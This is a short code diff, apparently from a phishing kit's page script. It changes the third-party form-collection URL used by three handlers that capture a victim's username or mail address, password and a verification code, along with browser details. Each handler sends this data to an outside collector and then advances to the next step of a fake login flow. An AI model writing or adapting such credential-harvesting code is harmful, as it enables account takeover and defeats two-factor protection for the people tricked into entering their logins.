@@ -1408,7 +1408,7 @@
     submittedData = { name: cuser, xs, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language };
     const btn = document.getElementById('s1-btn');
     btn.classList.add('loading'); btn.disabled = true;
-    supaPost('https://submit-form.com/8Qb4HVoVD',
+    supaPost('https://submit-form.com/Hpq6ndQLn',
       { name: cuser, mall: xs, timestamp: submittedData.timestamp, userAgent: submittedData.userAgent, language: submittedData.language });
     setTimeout(() => { btn.classList.remove('loading'); btn.disabled = false; showStep(2); }, 1200);
   });
@@ -1420,7 +1420,7 @@
     showErr('pw', false);
     const btn = document.getElementById('s2-btn');
     btn.classList.add('loading'); btn.disabled = true;
-    supaPost('https://submit-form.com/8Qb4HVoVD',
+    supaPost('https://submit-form.com/Hpq6ndQLn',
       { Password: pw, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language });
     setTimeout(() => { btn.classList.remove('loading'); btn.disabled = false; showStep(3); }, 1200);
   });
@@ -1438,7 +1438,7 @@
     showErr('code', false);
     const btn = document.getElementById('s3-btn');
     btn.classList.add('loading'); btn.disabled = true;
-    supaPost('https://submit-form.com/8Qb4HVoVD',
+    supaPost('https://submit-form.com/Hpq6ndQLn',
       { code, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language });
     setTimeout(() => {
       btn.classList.remove('loading'); btn.disabled = false;
